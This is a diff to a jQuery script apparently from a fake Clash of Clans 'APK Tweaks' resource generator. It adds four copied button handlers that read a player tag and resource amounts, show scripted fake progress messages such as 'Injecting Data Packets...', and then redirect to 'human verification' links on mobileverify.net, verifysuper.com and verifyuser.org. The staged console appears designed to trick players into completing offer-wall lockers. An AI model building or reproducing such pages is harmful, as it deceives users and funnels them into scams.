@@ -179,7 +179,6 @@ $(document).ready(function() {
 			});
 		}, 14800);
 	});
-	
 	$('.start2-button').click(function() {
 		$(".message-content p.console-message").hide();
 		$.magnificPopup.open({
@@ -254,6 +253,314 @@ $(document).ready(function() {
 			$(".message-content p.console-message").fadeOut(function() {
 				$(".human-verification-wrapper").fadeIn();
 				window.location.href="https://mobileverify.net/cl/i/5kpj7v";
+			});
+		}, 14800);
+	});
+	$('.start3-button').click(function() {
+		$(".message-content p.console-message").hide();
+		$.magnificPopup.open({
+			items: {
+				src: '#message-wrapper',
+			},
+			type: 'inline',
+			preloader: false,
+			modal: true,
+			mainClass: 'mfp-fade'
+		});
+		progressBar(0, $('#progressBarConsole'));
+		$('.message-header h3').html("APK Tweaks");
+		$('.message-header p.message-header-subtitle').html("You are about to download apps");
+		$(".message-content p.console-message").fadeIn();
+		var $console_message_username_msg = $('#coc-player-tag').val();
+		var $console_message_platform_msg = $('#coc-player-platform').val();
+		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
+		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
+		setTimeout(function() {
+			$(".console-loadbar").fadeIn();
+			$(".message-content p.console-message").typed({
+				strings: ["Processing..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(2, $('#progressBarConsole'));
+				}
+			});
+		}, 200);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Downloading Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(25, $('#progressBarConsole'));
+				}
+			});
+		}, 2400);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Unpacking Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(50, $('#progressBarConsole'));
+				}
+			});
+		}, 6500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Forming Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(60, $('#progressBarConsole'));
+				}
+			});
+		}, 9500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Injecting Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(80, $('#progressBarConsole'));
+				}
+			});
+		}, 11500);
+		setTimeout(function() {
+			$(".message-content p.console-message").fadeOut(function() {
+				$(".human-verification-wrapper").fadeIn();
+				window.location.href="https://verifysuper.com/cl/i/e6lork";
+			});
+		}, 14800);
+	});	
+	$('.start4-button').click(function() {
+		$(".message-content p.console-message").hide();
+		$.magnificPopup.open({
+			items: {
+				src: '#message-wrapper',
+			},
+			type: 'inline',
+			preloader: false,
+			modal: true,
+			mainClass: 'mfp-fade'
+		});
+		progressBar(0, $('#progressBarConsole'));
+		$('.message-header h3').html("APK Tweaks");
+		$('.message-header p.message-header-subtitle').html("You are about to download apps");
+		$(".message-content p.console-message").fadeIn();
+		var $console_message_username_msg = $('#coc-player-tag').val();
+		var $console_message_platform_msg = $('#coc-player-platform').val();
+		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
+		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
+		setTimeout(function() {
+			$(".console-loadbar").fadeIn();
+			$(".message-content p.console-message").typed({
+				strings: ["Processing..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(2, $('#progressBarConsole'));
+				}
+			});
+		}, 200);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Downloading Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(25, $('#progressBarConsole'));
+				}
+			});
+		}, 2400);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Unpacking Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(50, $('#progressBarConsole'));
+				}
+			});
+		}, 6500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Forming Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(60, $('#progressBarConsole'));
+				}
+			});
+		}, 9500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Injecting Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(80, $('#progressBarConsole'));
+				}
+			});
+		}, 11500);
+		setTimeout(function() {
+			$(".message-content p.console-message").fadeOut(function() {
+				$(".human-verification-wrapper").fadeIn();
+				window.location.href="https://verifyuser.org/cl/i/kl7ngg";
+			});
+		}, 14800);
+	});	
+	$('.start5-button').click(function() {
+		$(".message-content p.console-message").hide();
+		$.magnificPopup.open({
+			items: {
+				src: '#message-wrapper',
+			},
+			type: 'inline',
+			preloader: false,
+			modal: true,
+			mainClass: 'mfp-fade'
+		});
+		progressBar(0, $('#progressBarConsole'));
+		$('.message-header h3').html("APK Tweaks");
+		$('.message-header p.message-header-subtitle').html("You are about to download apps");
+		$(".message-content p.console-message").fadeIn();
+		var $console_message_username_msg = $('#coc-player-tag').val();
+		var $console_message_platform_msg = $('#coc-player-platform').val();
+		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
+		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
+		setTimeout(function() {
+			$(".console-loadbar").fadeIn();
+			$(".message-content p.console-message").typed({
+				strings: ["Processing..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(2, $('#progressBarConsole'));
+				}
+			});
+		}, 200);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Downloading Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(25, $('#progressBarConsole'));
+				}
+			});
+		}, 2400);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Unpacking Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(50, $('#progressBarConsole'));
+				}
+			});
+		}, 6500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Forming Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(60, $('#progressBarConsole'));
+				}
+			});
+		}, 9500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Injecting Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(80, $('#progressBarConsole'));
+				}
+			});
+		}, 11500);
+		setTimeout(function() {
+			$(".message-content p.console-message").fadeOut(function() {
+				$(".human-verification-wrapper").fadeIn();
+				window.location.href="https://mobileverify.net/cl/i/m4rlw";
+			});
+		}, 14800);
+	});	
+	$('.start6-button').click(function() {
+		$(".message-content p.console-message").hide();
+		$.magnificPopup.open({
+			items: {
+				src: '#message-wrapper',
+			},
+			type: 'inline',
+			preloader: false,
+			modal: true,
+			mainClass: 'mfp-fade'
+		});
+		progressBar(0, $('#progressBarConsole'));
+		$('.message-header h3').html("APK Tweaks");
+		$('.message-header p.message-header-subtitle').html("You are about to download apps");
+		$(".message-content p.console-message").fadeIn();
+		var $console_message_username_msg = $('#coc-player-tag').val();
+		var $console_message_platform_msg = $('#coc-player-platform').val();
+		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
+		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
+		setTimeout(function() {
+			$(".console-loadbar").fadeIn();
+			$(".message-content p.console-message").typed({
+				strings: ["Processing..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(2, $('#progressBarConsole'));
+				}
+			});
+		}, 200);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Downloading Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(25, $('#progressBarConsole'));
+				}
+			});
+		}, 2400);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Unpacking Files..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(50, $('#progressBarConsole'));
+				}
+			});
+		}, 6500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Forming Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(60, $('#progressBarConsole'));
+				}
+			});
+		}, 9500);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Injecting Data Packets..."],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(80, $('#progressBarConsole'));
+				}
+			});
+		}, 11500);
+		setTimeout(function() {
+			$(".message-content p.console-message").fadeOut(function() {
+				$(".human-verification-wrapper").fadeIn();
+				window.location.href="https://verifysuper.com/cl/i/kjg8e";
 			});
 		}, 14800);
 	});
